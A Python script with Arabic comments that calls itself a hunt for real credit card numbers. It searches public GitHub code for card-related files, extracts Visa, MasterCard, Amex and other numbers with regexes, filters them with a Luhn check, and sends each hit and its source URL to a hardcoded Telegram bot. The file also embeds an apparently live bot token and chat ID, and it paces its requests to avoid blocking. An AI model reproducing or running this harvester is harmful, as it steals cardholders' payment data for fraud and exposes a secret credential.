import sys
import re
import time
import random
import requests
from datetime import datetime, timedelta

# =================================================================
# التوكنات المضمنة
# =================================================================
TELEGRAM_TOKEN = "8914882875:AAGmoUu_Ckl16HA0wrcM6YICNz1ZH_WphCQ"
TELEGRAM_CHAT_ID = "6306556778"
# =================================================================

# مدة التشغيل 5 ساعات
TOTAL_RUN_DURATION = 5 * 60 * 60  # 18000 ثانية

# أنماط أرقام بطاقات الائتمان (فيزا، ماستركارد، أمريكان إكسبرس، إلخ)
CARD_PATTERNS = {
    'Visa': r'\b4[0-9]{12}(?:[0-9]{3})?\b',
    'MasterCard': r'\b5[1-5][0-9]{14}\b',
    'American Express': r'\b3[47][0-9]{13}\b',
    'Discover': r'\b6(?:011|5[0-9]{2})[0-9]{12}\b',
    'JCB': r'\b(?:2131|1800|35[0-9]{3})[0-9]{11}\b',
}

# ------------------- دوال التليجرام -------------------
def send_to_telegram(text, parse_mode='Markdown'):
    try:
        url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
        payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': text, 'parse_mode': parse_mode}
        requests.post(url, json=payload, timeout=10)
        print(f"[Telegram] {text[:50]}...")
    except Exception as e:
        print(f"Telegram Error: {e}")

def send_startup():
    msg = (
        f"🔥 *بدء صيد أرقام بطاقات الائتمان الحقيقية (5 ساعات)* 🔥\n"
        f"✅ سيتم البحث عن أرقام بطاقات فيزا/ماستركارد في مستودعات GitHub.\n"
        f"✅ سيتم التحقق من الصيغة (Luhn) وإرسال الصالح فقط.\n"
        f"✅ سيتم إرسال التحديثات كل 5 دقائق.\n"
        f"🕒 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
    )
    send_to_telegram(msg)

def send_heartbeat(elapsed_min, total_scanned, valid, invalid):
    msg = (
        f"💓 *تحديث دوري (كل 5 دقائق)* 💓\n"
        f"⏳ الوقت المنقضي: {elapsed_min} دقيقة\n"
        f"📂 عدد الملفات المفحوصة: {total_scanned}\n"
        f"✅ البطاقات الصالحة: {valid}\n"
        f"❌ البطاقات غير الصالحة (شكلياً): {invalid}\n"
        f"🕒 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
    )
    send_to_telegram(msg)

def send_valid_card(card_number, card_type, raw_url, detection_time):
    msg = (
        f"💳 *بطاقة صالحة (شكلياً)* 💳\n"
        f"النوع: {card_type}\n"
        f"الرقم: `{card_number}`\n"
        f"المصدر: {raw_url}\n"
        f"🕒 الاكتشاف: {detection_time}"
    )
    send_to_telegram(msg)

def send_final_report(total_scanned, valid, invalid):
    msg = (
        f"📊 *تقرير ختامي - صيد البطاقات (5 ساعات)* 📊\n"
        f"📂 إجمالي الملفات المفحوصة: {total_scanned}\n"
        f"✅ البطاقات الصالحة (شكلياً): {valid}\n"
        f"❌ البطاقات غير الصالحة: {invalid}\n"
        f"📅 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
    )
    send_to_telegram(msg)

# ------------------- التحقق من صحة الرقم باستخدام خوارزمية Luhn -------------------
def luhn_check(card_number):
    """التحقق من صحة رقم البطاقة باستخدام خوارزمية Luhn"""
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10 == 0

# ------------------- البحث في GitHub عن أرقام البطاقات -------------------
def search_github_for_cards():
    """يبحث عن ملفات تحتوي على أرقام بطاقات في مستودعات GitHub العامة"""
    found_cards = {}
    queries = [
        '"card number" extension:txt',
        '"credit card" extension:csv',
        '"visa" extension:txt',
        '"mastercard" extension:json',
        '"amex" extension:env'
    ]
    headers = {'Accept': 'application/vnd.github.v3+json'}
    for query in queries:
        try:
            url = f"https://api.github.com/search/code?q={query}&per_page=5"
            resp = requests.get(url, headers=headers, timeout=20)
            if resp.status_code == 200:
                items = resp.json().get('items', [])
                for item in items:
                    raw_url = item.get('html_url', '').replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                    if raw_url:
                        try:
                            file_resp = requests.get(raw_url, timeout=15)
                            if file_resp.status_code == 200:
                                content = file_resp.text
                                # البحث عن الأنماط المختلفة
                                for card_type, pattern in CARD_PATTERNS.items():
                                    matches = re.findall(pattern, content)
                                    for match in matches:
                                        # إزالة أي مسافات أو شرطات
                                        clean = re.sub(r'[\s-]', '', match)
                                        if len(clean) >= 13:  # أقل طول لبطاقة
                                            found_cards[clean] = (card_type, raw_url)
                        except:
                            continue
            time.sleep(random.uniform(1, 2))
        except:
            continue
    return found_cards

# ------------------- التشغيل الرئيسي -------------------
def main():
    start_time = time.time()
    end_time = start_time + TOTAL_RUN_DURATION
    
    send_startup()
    
    scanned_files = 0
    valid_count = 0
    invalid_count = 0
    last_heartbeat = time.time()
    processed_cards = set()  # لمنع التكرار
    
    while time.time() < end_time:
        # جلب البطاقات من GitHub
        cards = search_github_for_cards()
        
        if cards:
            for card_number, (card_type, raw_url) in cards.items():
                if card_number in processed_cards:
                    continue
                
                scanned_files += 1
                processed_cards.add(card_number)
                
                # التحقق من صحة الرقم باستخدام Luhn
                is_valid = luhn_check(card_number)
                
                if is_valid:
                    valid_count += 1
                    detection_time = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
                    send_valid_card(card_number, card_type, raw_url, detection_time)
                else:
                    invalid_count += 1
                
                time.sleep(random.uniform(0.5, 1.5))
        
        # إرسال نبض قلب كل 5 دقائق
        if time.time() - last_heartbeat >= 300:
            elapsed_min = int((time.time() - start_time) / 60)
            send_heartbeat(elapsed_min, scanned_files, valid_count, invalid_count)
            last_heartbeat = time.time()
        
        # انتظار 30 ثانية قبل البحث مرة أخرى (لتجنب الحظر)
        time.sleep(30)
    
    # التقرير الختامي
    send_final_report(scanned_files, valid_count, invalid_count)
    print("[+] انتهى التشغيل بعد 5 ساعات.")

if __name__ == "__main__":
    main()
